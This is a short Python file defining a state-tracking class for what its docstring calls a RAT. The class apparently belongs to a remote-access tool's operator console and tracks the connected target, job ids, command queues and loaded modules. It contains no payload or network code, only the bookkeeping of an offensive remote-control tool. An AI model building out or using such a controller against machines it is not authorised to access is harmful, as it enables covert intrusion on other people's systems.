import queue
import threading
from enum import Enum

class State(Enum):
    DISCONNECTED = 0
    CONNECTED = 1


class Rat_Ctx():
    '''Class that maintains the current state of the RAT'''

    def __init__(self):
        self.job_id = 0
        self.send_queue = queue.Queue()
        self.recv_queue = queue.Queue()
        self.conn = None
        self.processed = []
        self.lock = threading.Lock()
        self.loaded_modules = []
        self.deserializers = {}
        self.log_dir = "logs"
        self.wait_cmd = None
        self.prompt = f"{State.DISCONNECTED.name} > "
        self.state = State.DISCONNECTED.value
        self.target_name = None
    
    def get_next_job(self):
        '''Threadsafe way of getting a new job-id'''
        self.lock.acquire()
        job_id = self._increment_job_id()
        self.lock.release()
        return job_id
    
    def _increment_job_id(self):
        '''Increment job-id'''
        self.job_id += 1
        return self.job_id
    
    def update_state(self, state):
        self.state = state
        self.update_prompt()

    def update_prompt(self):
        if self.state == State.DISCONNECTED.value:
            self.prompt = "DISCONNECTED > "
        
        else:
            self.prompt = f"{self.target_name} > "